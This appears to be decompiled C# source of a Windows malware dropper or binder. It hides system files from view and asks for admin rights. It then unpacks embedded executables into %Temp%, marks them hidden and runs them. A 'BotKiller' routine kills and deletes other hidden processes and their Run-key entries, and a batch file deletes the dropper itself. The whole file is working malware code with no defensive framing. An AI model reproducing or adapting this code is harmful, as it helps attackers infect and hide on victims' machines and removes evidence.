using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class Program
{
	public static List<string> List = new List<string>(new string[2] { "HTAExploit Builder.exe|True|False|False|%Temp%|False|False|False", "tested_protected.exe|True|False|False|%Temp%|False|False|False" });

	public static Mutex _appMutex;

	public static string sp = "|";

	public static string MTX = "tVBTUKcE4COVxMoZn";

	[STAThread]
	public static void Main()
	{
		Thread.Sleep(2000);
		if (!CreateMutex())
		{
			Environment.Exit(Environment.ExitCode);
		}
		RunBotKiller();
		try
		{
			RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue("ShowSuperHidden"), (object)1, false))
			{
				registryKey.SetValue("ShowSuperHidden", 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (!AdminCheck())
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = Process.GetCurrentProcess().MainModule!.FileName;
				processStartInfo.Verb = "runas";
				processStartInfo.UseShellExecute = true;
				Process.Start(processStartInfo);
				Environment.Exit(Environment.ExitCode);
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Environment.Exit(Environment.ExitCode);
				ProjectData.ClearProjectError();
				return;
			}
		}
		WorkF();
	}

	public static object WorkF(object Code = null)
	{
		foreach (string item in List)
		{
			Code = item;
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(GETP(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[4]), (object)"\\"), (object)Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[0]));
			string path = Conversions.ToString(GETP(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[4]));
			if (!Directory.Exists(path))
			{
				try
				{
					Directory.CreateDirectory(path);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Convert.ToBoolean(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[2]))
			{
				if (!File.Exists(text))
				{
					try
					{
						File.WriteAllBytes(text, GetTheResource(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[0]));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					if (Convert.ToBoolean(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[3]))
					{
						try
						{
							File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						Process.Start(text);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
			}
			else
			{
				try
				{
					File.WriteAllBytes(text, GetTheResource(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[0]));
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				if (Convert.ToBoolean(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[3]))
				{
					try
					{
						File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
				if (Convert.ToBoolean(Strings.Split(Conversions.ToString(Code), sp, -1, (CompareMethod)0)[1]))
				{
					try
					{
						Process.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
			}
			GC.Collect();
		}
		DRun();
		object result = default(object);
		return result;
	}

	public static bool CreateMutex()
	{
		_appMutex = new Mutex(initiallyOwned: false, MTX, out var createdNew);
		return createdNew;
	}

	public static byte[] Decompress(byte[] input)
	{
		object obj = new MemoryStream(input);
		try
		{
			byte[] array = new byte[4];
			object[] array2 = new object[3] { array, 0, 4 };
			object[] array3 = array2;
			bool[] array4 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Read", array3, (string[])null, (Type[])null, array4, true);
			if (array4[0])
			{
				array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
			object obj2 = BitConverter.ToInt32(array, 0);
			object obj3 = new GZipStream((Stream)obj, CompressionMode.Decompress);
			try
			{
				object obj4 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(obj2, (object)1)) + 1)];
				object[] array5 = new object[3]
				{
					RuntimeHelpers.GetObjectValue(obj4),
					0,
					RuntimeHelpers.GetObjectValue(obj2)
				};
				object[] array6 = array5;
				array4 = new bool[3] { true, false, true };
				NewLateBinding.LateCall(obj3, (Type)null, "Read", array6, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					obj4 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array4[2])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				return (byte[])obj4;
			}
			finally
			{
				if (obj3 != null)
				{
					((IDisposable)obj3).Dispose();
				}
			}
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("uikzcjxy", executingAssembly);
		return Decompress((byte[])resourceManager.GetObject(Get_));
	}

	public static object GETP(string StrP)
	{
		if (StrP.Contains("%Current%"))
		{
			return StrP.Replace("%Current%", AppDomain.CurrentDomain.BaseDirectory);
		}
		return Environment.ExpandEnvironmentVariables(StrP);
	}

	public static bool AdminCheck()
	{
		bool result = default(bool);
		try
		{
			result = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object DRun()
	{
		object result = default(object);
		try
		{
			string text = Path.GetTempFileName() + ".bat";
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("timeout 3 > NUL");
				streamWriter.WriteLine("CD " + Application.get_StartupPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.get_ExecutablePath()) + "\" /f /q");
				streamWriter.WriteLine("CD " + Path.GetTempPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.UseShellExecute = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Environment.Exit(Environment.ExitCode);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void RunBotKiller()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (Inspection(process.MainModule!.FileName) && !IsWindowVisible(process.MainWindowHandle) && Operators.CompareString(process.MainModule!.FileName, Process.GetCurrentProcess().MainModule!.FileName, false) != 0)
				{
					RemoveFile(process);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void RemoveFile(Process process)
	{
		try
		{
			string fileName = process.MainModule!.FileName;
			process.Kill();
			RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileName);
			RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", fileName);
			Thread.Sleep(100);
			File.Delete(fileName);
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(fileName));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool Inspection(string threat)
	{
		if (Operators.CompareString(threat, Process.GetCurrentProcess().MainModule!.FileName, false) == 0)
		{
			return false;
		}
		if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
		{
			return true;
		}
		if (threat.StartsWith(Interaction.Environ("USERPROFILE")))
		{
			return true;
		}
		if (threat.Contains("wscript.exe"))
		{
			return true;
		}
		if (threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\\Microsoft.NET")))
		{
			return true;
		}
		return false;
	}

	public static bool IsWindowVisible(string lHandle)
	{
		return IsWindowVisible(lHandle);
	}

	public static void RegistryDelete(string regPath, string payload)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regPath, writable: true))
			{
				if (registryKey != null)
				{
					string[] valueNames = registryKey.GetValueNames();
					foreach (string name in valueNames)
					{
						if (registryKey.GetValue(name)!.ToString()!.Equals(payload))
						{
							registryKey.DeleteValue(name);
						}
					}
				}
			}
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			using RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(regPath, writable: true);
			if (registryKey2 == null)
			{
				return;
			}
			string[] valueNames2 = registryKey2.GetValueNames();
			foreach (string name2 in valueNames2)
			{
				if (registryKey2.GetValue(name2)!.ToString()!.Equals(payload))
				{
					registryKey2.DeleteValue(name2);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("User32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWindowVisible(IntPtr hWnd);
}
